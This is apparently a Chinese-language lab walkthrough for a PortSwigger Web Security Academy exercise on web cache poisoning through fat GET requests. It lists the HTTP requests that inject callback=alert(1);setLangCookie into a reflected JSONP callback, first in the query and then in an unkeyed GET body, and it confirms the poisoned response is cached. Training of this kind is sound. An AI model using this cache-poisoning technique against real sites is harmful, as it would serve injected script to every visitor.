# 实验室：通过胖 GET 请求进行 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞。它接受带有正文的 `GET` 请求，但不将正文包含在缓存键中。一名用户定期使用 Chrome 访问该网站首页。

要解决本实验室，请投毒缓存，使响应在受害者浏览器中执行 `alert(1)`。

[访问实验室](https://portswigger.net/academy/labs/launch/445170885a5022d81beaf56ed8c332d3ce302fe5d37e99e61a0674d3ac3e6260)

## 步骤

探测
- 访问首页

    ```http
    GET / HTTP/1.1
    Host: 0a92002704e660bb80b16cb80009002e.web-security-academy.net
    ```

    - 查看响应 HTML 代码

        ```html
        <script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
        ```

- 访问 JS 代码
    ```http
    GET /js/geolocate.js?callback=setCountryCookie HTTP/2
    Host: 0a92002704e660bb80b16cb80009002e.web-security-academy.net
    ```

    - 查看 JS 代码

        ```js
        const setCountryCookie = (country) => {
            document.cookie = 'country=' + country;

        };
        const setLangCookie = (lang) => {
            document.cookie = 'lang=' + lang;

        };
        setCountryCookie({
            "country": "United Kingdom"
        });
        ```
        - 检查查询参数 `setCountryCookie` 是否被反射

检查查询参数 `setCountryCookie` 是否被反射
- 请求
    ```http
    GET /js/geolocate.js?callback=alert(1)%3bsetLangCookie HTTP/2
    Host: 0a92002704e660bb80b16cb80009002e.web-security-academy.net
    ```
    - 响应

        ```js
        alert(1);
        setLangCookie({
            "country":"United Kingdom"
        }
        );
        ```
    
    - 查询参数被反射

- 检查 fat get 请求体参数传递
    ```http
    GET /js/geolocate.js?callback=setCountryCookie HTTP/2
    Host: 0a92002704e660bb80b16cb80009002e.web-security-academy.net

    callback=alert(1);setLangCookie
    ```

    - 响应
        ```js
        alert(1);
        setLangCookie({
            "country":"United Kingdom"
        }
        );
        ```
    
    - 请求体参数传递成功，并且在查询参数与请求体参数重名时，后端使用请求体参数

- 测试设置/移除载荷的缓存状态
    - 设置 hit 后，移除载荷仍缓存命中。可传递载荷的同时不被键控从而进行缓存污染
